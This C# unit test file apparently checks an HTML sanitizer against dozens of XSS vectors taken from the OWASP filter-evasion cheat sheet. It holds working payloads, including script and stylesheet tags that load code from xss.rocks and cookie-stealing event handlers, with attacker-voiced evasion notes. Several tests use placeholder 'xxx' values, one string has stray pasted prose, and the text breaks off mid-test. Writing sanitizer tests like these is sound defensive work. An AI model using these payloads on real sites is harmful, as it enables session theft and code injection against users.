using Microsoft.VisualStudio.TestTools.UnitTesting;
using RockFluid;
using System;

namespace UnitTestProject1
{
    /// <summary>
    /// Summary description for OwaspOrgXssFilterEvasionCheatSheet
    /// </summary>
    /// <see cref="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet"/>
    [TestClass]
    public class OwaspOrgXssFilterEvasionCheatSheet
    {
        /// <summary>
        /// This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):
        /// </summary>
        [TestMethod]
        public void NoFilterEvasion()
        {
            var expected = "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>".SanitizeHtml();
            var actual = "";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:
        /// </summary>
        [TestMethod]
        public void ImageXssUsingTheJavaScriptDirective()
        {
            var expected = "<IMG SRC=\"javascript: alert('XSS'); \">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void NoQuotesAndNoSemicolon()
        {
            var expected = "<IMG SRC=javascript:alert('XSS')>".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void CaseInsensitiveXssAttackVector()
        {
            var expected = "<IMG SRC=javascript:alert(&quot;XSS&quot;)>".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// The semicolons are required for this to work:
        /// </summary>
        [TestMethod]
        public void HtmlEntities()
        {
            var expected = "<IMG SRC=javascript:alert(&quot;XSS&quot;)>".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents:
        /// </summary>
        [TestMethod]
        public void GraveAccentObfuscation()
        {
            var expected = "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void MalformedATag01()
        {
            var expected = "<a onmouseover=\"alert(document.cookie)\">xxs link</a>".SanitizeHtml();
            var actual = "<a>xxs link</a>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void MalformedATag02()
        {
            var expected = "<a onmouseover=alert(document.cookie)>xxs link</a>".SanitizeHtml();
            var actual = "<a>xxs link</a>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tag
        /// </summary>
        [TestMethod]
        public void MalformedImgTags()
        {
            var expected = "<IMG \"\"\" >< SCRIPT > alert(\"XSS\") </ SCRIPT > \">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need:
        /// </summary>
        [TestMethod]
        public void fromCharCode()
        {
            var expected = "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This will bypass most SRC domain filters. Inserting javascript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like onblur, onclick giving you an extensive amount of variations for many injections listed here.
        /// </summary>
        [TestMethod]
        public void DefaultSrcTagToGetPastFiltersThatCheckSrcDomain()
        {
            var expected = "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void DefaultSrcTagByLeavingItEmpty()
        {
            var expected = "<IMG SRC= onmouseover=\"alert('xxs')\">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void DefaultSrcTagByLeavingItOutEntirely()
        {
            var expected = "<IMG onmouseover=\"alert('xxs')\">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void OnErrorAlert()
        {
            var expected = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88, 83, 83))\"></img>".SanitizeHtml();
            var actual = "<img src=\"/\">";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void ImgOnerrorAndJavascriptAlertEncode()
        {
            var expected = "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">".SanitizeHtml();
            var actual = "<img src=\"x\">";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// all of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).
        /// </summary>
        [TestMethod]
        public void DecimalHtmlCharacterReferences()
        {
            var expected = $"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;{Environment.NewLine}&#39;&#88;&#83;&#83;&#39;&#41;>".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This is often effective in XSS that attempts to look for "&#XX;", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild):
        /// </summary>
        [TestMethod]
        public void DecimalHtmlCharacterReferencesWithoutTrailingSemicolons()
        {
            var expected = $"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&{Environment.NewLine}#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This is often effective in XSS that attempts to look for "&#XX;", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild):
        /// </summary>
        [TestMethod]
        public void HexadecimalHtmlCharacterReferencesWithoutTrailingSemicolons()
        {
            var expected = "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Used to break up the cross site scripting attack:
        /// </summary>
        [TestMethod]
        public void EmbeddedTab()
        {
            var expected = "<IMG SRC=\"jav ascript:alert('XSS'); \">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Use this one to break up XSS :
        /// </summary>
        [TestMethod]
        public void EmbeddedEncodedTab()
        {
            var expected = "<IMG SRC=\"jav &#x09;ascript:alert('XSS');\">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:
        /// </summary>
        [TestMethod]
        public void EmbeddedNewlineToBreakUpXss()
        {
            var expected = "<IMG SRC=\"jav &#x0A;ascript:alert('XSS');\">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):
        /// </summary>
        [TestMethod]
        public void EmbeddedCarriageReturnToBreakUpXss()
        {
            var expected = "<IMG SRC=\"jav &#x0D;ascript:alert('XSS');\">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void NullBreaksUpJavaScriptDirective()
        {
            var expected = "perl -e 'print \" < IMG SRC = java\0script: alert(\\\"XSS\\\")>\"; ' > out\">".SanitizeHtml();
            var actual = "perl -e 'print <img> out";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This is useful if the pattern match doesn't take into account spaces in the word "javascript:" -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the "javascript:" keyword. The actual reality is you can have any char from 1-32 in decimal:
        /// </summary>
        [TestMethod]
        public void SpacesAndMetaCharsBeforeTheJavaScriptInImagesForXss()
        {
            var expected = "<IMG SRC=\" &#14;  javascript:alert('XSS');\">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example "<SCRIPT\s" != "<SCRIPT/XSS\s":
        /// </summary>
        [TestMethod]
        public void NonAlphaNonDigitXss01()
        {
            var expected = "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>".SanitizeHtml();
            var actual = "";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example "<SCRIPT\s" != "<SCRIPT/XSS\s":
        /// </summary>
        [TestMethod]
        public void NonAlphaNonDigitXss02()
        {
            var expected = "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>".SanitizeHtml();
            var actual = "<body></body>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example "<SCRIPT\s" != "<SCRIPT/XSS\s":
        /// </summary>
        [TestMethod]
        public void NonAlphaNonDigitXss03()
        {
            var expected = "<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>".SanitizeHtml();
            var actual = "";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error:
        /// </summary>
        [TestMethod]
        public void ExtraneousOpenBrackets()
        {
            var expected = "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>".SanitizeHtml();
            var actual = "";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the "></SCRIPT>" portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:
        /// </summary>
        [TestMethod]
        public void NoClosingScriptTags()
        {
            var expected = "<SCRIPT SRC=http://xss.rocks/xss.js?< B >".SanitizeHtml();
            var actual = "";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This particular variant was submitted by Łukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ".j" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.
        /// </summary>
        [TestMethod]
        public void ProtocolResolutionInScriptTags()
        {
            var expected = "<SCRIPT SRC=//xss.rocks/.j>".SanitizeHtml();
            var actual = "";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Unlike Firefox the IE rendering engine doesn't add extra data to your page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close ">" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/ because it doesn't require the end ">". As a side note, this was also affective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag:
        /// </summary>
        [TestMethod]
        public void HalfOpenHTMLJavascriptXSSVector()
        {
            var expected = "<IMG SRC=\"javascript:alert('XSS')\"".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't:
        /// </summary>
        [TestMethod]
        public void DoubleOpenAngleBrackets()
        {
            var expected = "<iframe src=http://xss.rocks/scriptlet.html <".SanitizeHtml();
            var actual = "<iframe src=\"http://xss.rocks/scriptlet.html\">";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a="$ENV{QUERY_STRING}";</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this gets injected it will read <SCRIPT>var a="\\";alert('XSS');//";</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.:
        /// </summary>
        [TestMethod]
        public void EscapingJavascriptEscapes01()
        {
            var expected = "\\\"; alert('XSS');//".SanitizeHtml();
            var actual = "";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a="$ENV{QUERY_STRING}";</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this gets injected it will read <SCRIPT>var a="\\";alert('XSS');//";</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.:
        /// </summary>
        [TestMethod]
        public void EscapingJavascriptEscapes02()
        {
            var expected = "</script><script>alert('XSS');</script>".SanitizeHtml();
            var actual = "";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This is a simple XSS vector that closes <TITLE> tags, which can encapsulate the malicious cross site scripting attack:
        /// </summary>
        [TestMethod]
        public void EndTitleTag()
        {
            var expected = "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>".SanitizeHtml();
            var actual = "";
            Assert.AreEqual(expected, actual);
        }


        [TestMethod]
        public void InputImage()
        {
            var expected = "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">".SanitizeHtml();
            var actual = "";    //-- Input elements are not in the default whitelist.
            Assert.AreEqual(expected, actual);
        }


        [TestMethod]
        public void BODYImage()
        {
            var expected = "<BODY BACKGROUND=\"javascript:alert('XSS')\">".SanitizeHtml();
            var actual = "<body></body>";
            Assert.AreEqual(expected, actual);
        }


        [TestMethod]
        public void IMGDynsrc()
        {
            var expected = "<IMG DYNSRC=\"javascript:alert('XSS')\">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }


        [TestMethod]
        public void IMGLowsrc()
        {
            var expected = "<IMG LOWSRC=\"javascript:alert('XSS')\">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:
        /// </summary>
        [TestMethod]
        public void ListStyleImage()
        {
            var expected = "<STYLE>li {list - style - image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }


        [TestMethod]
        public void VbscriptInAnImage()
        {
            var expected = "<IMG SRC='vbscript:msgbox(\"XSS\")'>".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void LivescriptOlderVersionsOfNetscapeOnly()
        {
            var expected = "<IMG SRC=\"livescript:[code]\">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }


        [TestMethod]
        public void SVGObjectTag()
        {
            var expected = "<svg/onload=alert('XSS')>".SanitizeHtml();
            var actual = "";   //-- SVG tag is non-standard and thus not in default whitelist.
            Assert.AreEqual(expected, actual);
        }


        [TestMethod]
        public void Ecmascript6()
        {
            var expected = "Set.constructor`alert\x28document.domain\x29```".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Method doesn't require using any variants of "javascript:" or "<SCRIPT..." to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign ("onload=" != "onload ="):
        /// </summary>
        [TestMethod]
        public void BODYTag()
        {
            var expected = "<BODY ONLOAD=alert('XSS')>".SanitizeHtml();
            var actual = "<body></body>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void BGSOUND()
        {
            var expected = "<BGSOUND SRC=\"javascript:alert('XSS');\">".SanitizeHtml();
            var actual = "";   //-- Not in default whitelist as this tag is now Obsolete.
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void JavascriptIncludes()
        {
            var expected = "<BR SIZE=\"&{alert('XSS')}\">".SanitizeHtml();
            var actual = "<br>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void STYLESheet()
        {
            var expected = "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">".SanitizeHtml();
            var actual = "<link rel=\"stylesheet\">";
            Assert.AreEqual(expected, actual);
        }
        /// <summary>
        /// (using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:
        /// </summary>
        [TestMethod]
        public void RemoteStyleSheet()
        {
            var expected = "<LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\">".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This works the same as above, but uses a <STYLE> tag instead of a <LINK> tag). A slight variation on this vector was used to hack Google Desktop. As a side note, you can remove the end </STYLE> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:
        /// </summary>
        [TestMethod]
        public void RemoteStyleSheetPart2()
        {
            var expected = "<STYLE>@import'http://xss.rocks/xss.css';</STYLE>".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http://xss.rocks/xss.css>; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox:
        /// </summary>
        [TestMethod]
        public void RemoteStyleSheetPart3()
        {
            var expected = "<META HTTP-EQUIV=\"Link\" Content=\"<http://xss.rocks/xss.css>; REL=stylesheet\">".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites:
        /// </summary>
        [TestMethod]
        public void RemoteStyleSheetPart4()
        {
            var expected = "<STYLE>BODY{-moz - binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This XSS at times sends IE into an infinite loop of alerts:
        /// </summary>
        [TestMethod]
        public void STYLETagsWithBrokenUpJavascriptForXSS()
        {
            var expected = "<STYLE>@im\\port'\\ja\vasc\\ript:alert(\"XSS\")';</STYLE>".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void STYLEAttributeUsingACommentToBreakUpExpression()
        {
            var expected = "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void STYLETagOlderVersionsOfNetscapeOnly()
        {
            var expected = "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>".SanitizeHtml();
            var actual = "";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void STYLETagUsingBackgroundImage()
        {
            var expected = "<STYLE>.XSS{background - image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>".SanitizeHtml();
            var actual = $"xxx";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void STYLETagUsingBackground()
        {
            var expected = "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// IE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:
        /// </summary>
        [TestMethod]
        public void AnonymousHtmlWithStyleAttribute()
        {
            var expected = "<XSS STYLE=\"xss:expression(alert('XSS'))\">".SanitizeHtml();
            var actual = "";   //-- Non-standard tags are not in the whitelist and thus rejected.
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute:
        /// </summary>
        [TestMethod]
        public void LocalHtcFile()
        {
            var expected = "<XSS STYLE=\"behavior: url(xss.htc);\">".SanitizeHtml();
            var actual = "";   //-- Non-standard tags are not in the whitelist and thus rejected.
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding.
        /// </summary>
        [TestMethod]
        public void USASCIIEncoding()
        {
            var expected = "¼script¾alert(¢XSS¢)¼/script¾".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:
        /// </summary>
        [TestMethod]
        public void META()
        {
            var expected = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Directive URL scheme. This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see RFC 2397 for more details or go here or here to encode your own. You can also use the XSS calculator below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method:
        /// </summary>
        [TestMethod]
        public void METAUsingData()
        {
            var expected = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// If the target website attempts to see if the URL contains "http://" at the beginning you can evade it with the following technique (Submitted by Moritz Naumann):
        /// </summary>
        [TestMethod]
        public void METAWithAdditionalURLParameter()
        {
            var expected = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// If iframes are allowed there are a lot of other XSS problems as well:
        /// </summary>
        [TestMethod]
        public void IFRAME()
        {
            var expected = "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>".SanitizeHtml();
            var actual = "<iframe></iframe>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// IFrames and most other elements can use event based mayhem like the following... (Submitted by: David Cross)
        /// </summary>
        [TestMethod]
        public void IFRAMEEventBased()
        {
            var expected = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>".SanitizeHtml();
            var actual = "<iframe src=\"#\"></iframe>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Frames have the same sorts of XSS problems as iframes
        /// </summary>
        [TestMethod]
        public void FRAME()
        {
            var expected = "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>".SanitizeHtml();
            var actual = "<frameset><frame></frameset>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void TABLE()
        {
            var expected = "<TABLE BACKGROUND=\"javascript:alert('XSS')\">".SanitizeHtml();
            var actual = "<table></table>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:
        /// </summary>
        [TestMethod]
        public void TD()
        {
            var expected = "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">".SanitizeHtml();
            var actual = "<table><td></td></table>";
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void DivBackgroundImage()
        {
            var expected = "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">".SanitizeHtml();
            var actual = "<div>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:
        /// </summary>
        [TestMethod]
        public void DIVBackgroundImageWithUnicodedXSSExploit()
        {
            var expected = "<DIV STYLE=\"background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029\">".SanitizeHtml();
            var actual = "<div>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
        /// </summary>
        [TestMethod]
        public void DIVBackgroundImagePlusExtraCharacters()
        {
            var expected = "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">".SanitizeHtml();
            var actual = "<div>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// A variant of this was effective against a real world cross site scripting filter using a newline between the colon and "expression":
        /// </summary>
        [TestMethod]
        public void DIVExpression()
        {
            var expected = "<DIV STYLE=\"width: expression(alert('XSS'));\">".SanitizeHtml();
            var actual = "<div></div>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn't do the job:
        /// </summary>
        [TestMethod]
        public void DownlevelHiddenBlock()
        {
            var expected = "<!--[if gte IE 4]>{Environment.NewLine} <SCRIPT>alert('XSS');</SCRIPT>{Environment.NewLine} <![endif]-->".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Works in IE and Netscape 8.1 in safe mode. You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like "images/image.jpg" rather than full paths. If the path includes a leading forward slash like "/images/image.jpg" you can remove one slash from this vector (as long as there are two to begin the comment this will work):
        /// </summary>
        [TestMethod]
        public void BASETag()
        {
            var expected = "<BASE HREF=\"javascript:alert('XSS');//\">".SanitizeHtml();
            var actual = "<base>";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS:
        /// </summary>
        [TestMethod]
        public void OBJECTTag()
        {
            var expected = "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>".SanitizeHtml();
            var actual = "";   //-- Object tag can contain dangerous objects and thus not in the whitelist.
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
        /// </summary>
        [TestMethod]
        public void UsingAnEMBEDTagYouCanEmbedAFlashMovieThatContainsXSS()
        {
            var expected = "EMBED SRC=\"http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess=\"never\" and allownetworking=\"internal\" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:{Environment.NewLine}org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>".SanitizeHtml();
